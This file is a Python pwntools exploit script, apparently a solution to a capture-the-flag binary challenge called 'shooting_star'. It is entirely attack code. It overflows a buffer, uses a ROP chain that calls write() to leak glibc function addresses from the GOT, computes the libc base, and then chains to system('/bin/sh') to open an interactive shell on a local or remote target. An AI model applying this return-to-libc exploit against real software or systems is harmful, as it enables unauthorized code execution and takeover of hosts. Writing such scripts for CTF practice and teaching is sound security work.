#!/usr/bin/env python3

from pwn import *

context.binary = 'shooting_star'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


pop_rdi_ret         = 0x4012cb
pop_rsi_pop_r15_ret = 0x4012c9

write_plt = 0x401030
main_addr = 0x401230

offset = 72
junk = b'A' * offset


def leak(p, function_got: int) -> int:
    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(function_got)
    payload += p64(0)
    payload += p64(write_plt)
    payload += p64(main_addr)

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', payload)
    p.recvline()
    p.recvline()

    return u64(p.recv(8))


def main():
    p = get_process()

    write_got   = 0x404018
    read_got    = 0x404020
    setvbuf_got = 0x404028

    write_addr   = leak(p, write_got)
    read_addr    = leak(p, read_got)
    setvbuf_addr = leak(p, setvbuf_got)

    log.info(f'Leaked write() address:   {hex(write_addr)}')
    log.info(f'Leaked read() address:    {hex(read_addr)}')
    log.info(f'Leaked setvbuf() address: {hex(setvbuf_addr)}')

    setvbuf_offset = 0x813d0   # 0x84ce0
    system_offset  = 0x4f550   # 0x52290
    bin_sh_offset  = 0x1b3e1a  # 0x1b45bd

    glibc_base_addr = setvbuf_addr - setvbuf_offset
    log.success(f'Glibc base address: {hex(glibc_base_addr)}')

    system_addr = glibc_base_addr + system_offset
    bin_sh_addr = glibc_base_addr + bin_sh_offset

    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
